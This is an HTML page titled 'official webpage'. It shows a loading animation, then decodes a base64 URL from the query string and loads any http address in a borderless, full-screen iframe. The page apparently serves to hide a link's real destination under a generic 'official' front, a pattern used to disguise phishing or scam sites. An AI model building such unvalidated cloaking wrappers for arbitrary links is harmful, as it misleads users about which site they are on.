<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
  <meta content="yes" name="apple-mobile-web-app-capable">
  <meta content="yes" name="apple-touch-fullscreen">
  <meta content="black" name="apple-mobile-web-app-status-bar-style">
  <meta content="320" name="MobileOptimized">
  <title>官方网页</title>
  <style>
   .container {
      width: 100px;
      height: 100px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border: none; /* 添加这行代码 */
    }

   .dot {
      width: 15px;
      height: 15px;
      border-radius: 50%;
      background-color: #000;
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      margin: auto;
      border: none; /* 添加这行代码 */
    }

   .dot-3 {
      background-color: #f74d75;
    }

   .dot-2 {
      background-color: #10beae;
    }

   .dot-1 {
      background-color: #ffe386;
    }

   .dot-3 {
      background-color: #f74d75;
      animation: dot-3-move 2s ease infinite;
    }

    @keyframes dot-3-move {
      20% {
        transform: scale(1)
      }

      45% {
        transform: translateY(-18px) scale(.45)
      }

      60% {
        transform: translateY(-25px) scale(.45)
      }

      80% {
        transform: translateY(-25px) scale(.45)
      }

      100% {
        transform: translateY(0px) scale(1)
      }
    }

   .dot-2 {
      background-color: #10beae;
      animation: dot-2-move 2s ease infinite;
    }

   .dot-1 {
      background-color: #ffe386;
      animation: dot-1-move 2s ease infinite;
    }

    @keyframes dot-2-move {
      20% {
        transform: scale(1)
      }

      45% {
        transform: translate(-16px, 12px) scale(.45)
      }

      60% {
        transform: translate(-20px, 15px) scale(.45)
      }

      80% {
        transform: translate(-20px, 15px) scale(.45)
      }

      100% {
        transform: translateY(0px) scale(1)
      }
    }

    @keyframes dot-1-move {
      20% {
        transform: scale(1)
      }

      45% {
        transform: translate(16px, 12px) scale(.45)
      }

      60% {
        transform: translate(20px, 15px) scale(.45)
      }

      80% {
        transform: translate(20px, 15px) scale(.45)
      }

      100% {
        transform: translateY(0px) scale(1)
      }
    }

   .container {
      width: 100px;
      height: 100px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: rotate-move 2s ease-in-out infinite;
    }

    @keyframes rotate-move {
      55% {
        transform: translate(-50%, -50%) rotate(0deg)
      }

      80% {
        transform: translate(-50%, -50%) rotate(360deg)
      }

      100% {
        transform: translate(-50%, -50%) rotate(360deg)
      }
    }

   .content {
      height: 100%;
      width: 100%;
      position: fixed;
      left: 0;
      top: 0;
      border: none; /* 添加这行代码 */
    }
  </style>
</head>

<body>

  <div class="container">
    <div class="dot dot-1"></div>
    <div class="dot dot-2"></div>
    <div class="dot dot-3"></div>
  </div>
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const encodedParam = urlParams.get('c');

    if (encodedParam) {
      try {
        const trueUrl = atob(encodedParam);
        if (trueUrl.includes('http')) {
          const container = document.querySelector('.container');
          setTimeout(() => {
            container.style.display = 'none';
            const iframe = document.createElement('iframe');
            iframe.className = 'content';
            iframe.src = trueUrl;
            iframe.onload = () => {
              bindMouseWheel(iframe);
            };
            document.body.appendChild(iframe);
          }, 1500);
        } else {
          console.log('无效URL');
        }
      } catch (e) {
        console.error('URL解码失败:', e);
      }
    }

    function bindMouseWheel(iframe) {
      try {
        const doc = iframe.contentWindow.document;
        const isFirefox = navigator.userAgent.includes('Firefox');

        function handleMouseWheel(e) {
          e.preventDefault();
          const up = isFirefox? e.detail < 0 : e.wheelDelta > 0;
          const scrollAmount = up? -50 : 50;
          doc.body.scrollTop = doc.documentElement.scrollTop += scrollAmount;
        }

        if (isFirefox) {
          doc.addEventListener('DOMMouseScroll', handleMouseWheel, false);
        } else {
          doc.onmousewheel = handleMouseWheel;
        }
      } catch (e) {
        console.error('跨域访问iframe失败:', e);
      }
    }
  </script>

</body>

</html>
